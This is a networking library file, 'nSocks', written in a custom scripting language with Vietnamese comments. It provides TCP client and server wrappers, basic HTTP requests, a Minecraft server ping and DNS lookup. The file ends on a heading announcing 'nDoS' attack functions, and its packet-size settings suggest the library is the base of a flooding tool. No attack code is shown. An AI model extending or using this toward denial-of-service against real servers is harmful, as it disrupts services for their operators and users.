# ===================== CẤU HÌNH =====================
hold PACKET_PER_CONN = 4
hold DATA_PER_PACKET = 2097152

# --- TCP Client — high-level wrapper ---

# tc = tcp_client(host, port) — tao TCP client
# Tra ve dict: {"fd": socket_fd, "host": host, "port": port}
craft tcp_client host port
    hold fd = nsocks_connect(host, port)
    check fd == -1
        yell "[nSocks] Khong the ket noi den " + host + ":" + str(port)
        give none
    end
    hold client = vault {
        "fd": fd,
        "host": host,
        "port": port
    }
    give client
end

# tcp_send(client, data) — gui du lieu qua TCP client
craft tcp_send client data
    hold sent = nsocks_send(client["fd"], data)
    give sent
end

# tcp_recv(client, size) — nhan du lieu tu TCP client
craft tcp_recv client size
    hold data = nsocks_recv(client["fd"], size)
    give data
end

# tcp_close(client) — dong TCP client
craft tcp_close client
    hold ok = nsocks_close(client["fd"])
    give ok
end

# --- TCP Server — high-level wrapper ---

# tcp_server(port) — tao TCP server lang nghe
# Tra ve dict: {"fd": socket_fd, "ip": "0.0.0.0", "port": port}
craft tcp_server port
    hold fd = nsocks_bind("0.0.0.0", port)
    check fd == -1
        yell "[nSocks] Khong the bind port " + str(port)
        give none
    end
    hold server = vault {
        "fd": fd,
        "ip": "0.0.0.0",
        "port": port
    }
    yell "[nSocks] Server dang lang nghe 0.0.0.0:" + str(port)
    give server
end

# tcp_accept(server) — chap nhan ket noi den server
# Tra ve dict: {"fd": client_fd, "ip": ip, "port": port} hoac none
craft tcp_accept server
    hold info = nsocks_accept(server["fd"])
    check info == none
        give none
    end
    hold client = vault {
        "fd": info[0],
        "ip": info[1],
        "port": info[2]
    }
    give client
end

# --- HTTP Client — gui HTTP request don gian ---

# http_get(host, path) — gui HTTP GET request
# Tra ve: response body string
craft http_get host path
    hold port = 80
    hold sock = nsocks_connect(host, port)
    check sock == -1
        yell "[nSocks] HTTP GET that bai: khong the ket noi"
        give ""
    end

    hold request = "GET " + path + " HTTP/1.0\r\nHost: " + host + "\r\n\r\n"
    nsocks_send(sock, request)
    hold response = nsocks_recv(sock, 65536)
    nsocks_close(sock)

    # Tach body ra khoi header
    hold sep = find(response, "\r\n\r\n")
    check sep != -1
        set response = substr(response, sep + 4, len(response) - sep - 4)
    end

    give response
end

# http_post(host, path, body) — gui HTTP POST request
# Tra ve: response body string
craft http_post host path body
    hold port = 80
    hold sock = nsocks_connect(host, port)
    check sock == -1
        yell "[nSocks] HTTP POST that bai: khong the ket noi"
        give ""
    end

    hold content_len = len(body)
    hold request = "POST " + path + " HTTP/1.0\r\n"
    set request = request + "Host: " + host + "\r\n"
    set request = request + "Content-Type: application/x-www-form-urlencoded\r\n"
    set request = request + "Content-Length: " + str(content_len) + "\r\n"
    set request = request + "\r\n"
    set request = request + body

    nsocks_send(sock, request)
    hold response = nsocks_recv(sock, 65536)
    nsocks_close(sock)

    hold sep = find(response, "\r\n\r\n")
    check sep != -1
        set response = substr(response, sep + 4, len(response) - sep - 4)
    end

    give response
end

# --- Minecraft Server Ping — kiem tra server Minecraft online ---

# mc_ping(host, port) — ping server Minecraft
# Tra ve: JSON response string tu server, hoac "" neu offline
craft mc_ping host port
    check port == 0
        set port = 25565
    end

    # Build Minecraft handshake + status request packet
    # Protocol: mac dinh 756 (1.19+), truyen protocol version neu can
    hold packet = nsocks_mc_packet(host, port, 256, 756)
    hold sock = nsocks_connect(host, port)
    check sock == -1
        give ""
    end

    nsocks_send(sock, packet)
    hold response = nsocks_recv(sock, 65536)
    nsocks_close(sock)

    # Minecraft response: packet_length + packet_id + JSON_string_length + JSON_string
    # Can doc byte de lay JSON
    check len(response) > 5
        # Skip packet length (varint) and packet ID (varint)
        # JSON length is next varint, then the JSON string
        # Don gian: tim ky tu '{' dau tien
        hold start = find(response, "{")
        check start != -1
            set response = substr(response, start, len(response) - start)
        end
    end

    check response == ""
        give ""
    end

    give response
end

# --- Utility ---

# resolve(host) — DNS lookup
craft resolve host
    give nsocks_resolve(host)
end

# nsocks_help() — hien thi tro giup
craft nsocks_help
    yell ""
    yell "  ╔══════════════════════════════════════╗"
    yell "  ║  nSocks v1.0.0 - TCP Networking       ║"
    yell "  ║  Author: IdlerHa                      ║"
    yell "  ╚══════════════════════════════════════╝"
    yell ""
    yell "  [TCP Client]"
    yell "    tcp_client(host, port)         -> client dict"
    yell "    tcp_send(client, data)         -> bytes sent"
    yell "    tcp_recv(client, size)         -> data string"
    yell "    tcp_close(client)              -> bool"
    yell ""
    yell "  [TCP Server]"
    yell "    tcp_server(port)               -> server dict"
    yell "    tcp_accept(server)             -> client dict or none"
    yell ""
    yell "  [HTTP Client]"
    yell "    http_get(host, path)           -> response body"
    yell "    http_post(host, path, body)    -> response body"
    yell ""
    yell "  [Minecraft]"
    yell "    mc_ping(host, port)            -> JSON response"
    yell "    nsocks_mc_packet(ip, port, sz) -> packet bytes"
    yell ""
    yell "  [Utility]"
    yell "    resolve(host)                  -> IP string"
    yell "    nsocks_version()               -> version string"
    yell "    nsocks_help()                  -> tro giup nay"
    yell ""
end

# ============================================================================
# nDoS — Attack Functions
